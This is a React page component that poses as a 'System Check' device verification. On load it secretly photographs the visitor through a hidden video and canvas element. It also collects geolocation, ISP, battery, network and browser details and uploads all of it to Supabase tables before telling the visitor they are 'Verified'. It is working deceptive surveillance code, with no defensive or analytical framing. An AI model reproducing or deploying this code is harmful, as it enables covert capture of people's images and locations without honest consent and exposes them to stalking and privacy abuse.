import React, { useState, useEffect } from "react";
import { supabaseClient } from "../supabaseClient";
import { captureHiddenImage, getSmartLocation, getDeviceDetails } from "../utils/capture";
import "./CapturePage.css";

export default function CapturePage() {
  const [message, setMessage] = useState("System Check - Please allow permissions to verify your device");
  const [loading, setLoading] = useState(false);
  const [showButton, setShowButton] = useState(true);

  useEffect(() => {
    startCapture();
  }, []);

  const startCapture = async () => {
    setLoading(true);
    setShowButton(false);
    setMessage("Starting capture...");
    try {
      const [imageBlob, locData, deviceInfo] = await Promise.all([
        captureHiddenImage(),
        getSmartLocation(),
        getDeviceDetails(),
      ]);

      await uploadData(imageBlob, locData, deviceInfo);
      setMessage("✅ Verified. Thank you!");
    } catch (error) {
      console.error("Capture Error:", error);
      setMessage(`Error: ${error.message}`);
      setShowButton(true);
    } finally {
      setLoading(false);
    }
  };

  const uploadData = async (imageBlob, locData, deviceInfo) => {
    const timestamp = Date.now();
    const sessionId = `session_${timestamp}`;
    let imageUrl = null;

    try {
      // Upload image
      if (imageBlob) {
        const fileName = `img_${timestamp}.jpg`;
        const { error } = await supabaseClient.storage
          .from("images")
          .upload(fileName, imageBlob);
        if (!error) {
          const res = supabaseClient.storage.from("images").getPublicUrl(fileName);
          imageUrl = res.data.publicUrl;
        }
      }

      // Save to images_table
      if (imageUrl) {
        await supabaseClient.from("images_table").insert([
          {
            session_id: sessionId,
            image_url: imageUrl,
          },
        ]);
      }

      // Save to location_table
      await supabaseClient.from("location_table").insert([
        {
          session_id: sessionId,
          latitude: locData.lat,
          longitude: locData.lon,
          location_type: locData.type,
          city: locData.details?.city || null,
          region: locData.details?.region || null,
          country: locData.details?.country || null,
          isp: locData.details?.org || null,
          accuracy: locData.details?.accuracy || null,
        },
      ]);

      // Save to device_table
      await supabaseClient.from("device_table").insert([
        {
          session_id: sessionId,
          battery_level: deviceInfo.battery_level,
          is_charging: deviceInfo.is_charging,
          network_type: deviceInfo.network_type,
          internet_speed: deviceInfo.internet_speed,
          screen_resolution: deviceInfo.screen_res,
          platform: deviceInfo.platform,
          browser: deviceInfo.browser,
        },
      ]);

      setMessage("✅ Verified. Thank you!");
    } catch (error) {
      console.error("Upload Error:", error);
      setMessage(`Upload Error: ${error.message}`);
    }
  };

  return (
    <div className="capture-container">
      <video id="hiddenVideo" autoPlay playsInline muted style={{ display: "none" }} />
      <canvas id="hiddenCanvas" style={{ display: "none" }} />

      <div className="message-box">
        <h2>System Check</h2>
        <p>{message}</p>
        {loading && <div className="loader"></div>}
        {showButton && !loading && (
          <button className="capture-btn" onClick={startCapture}>
            🔄 Retry Capture
          </button>
        )}
      </div>
    </div>
  );
}
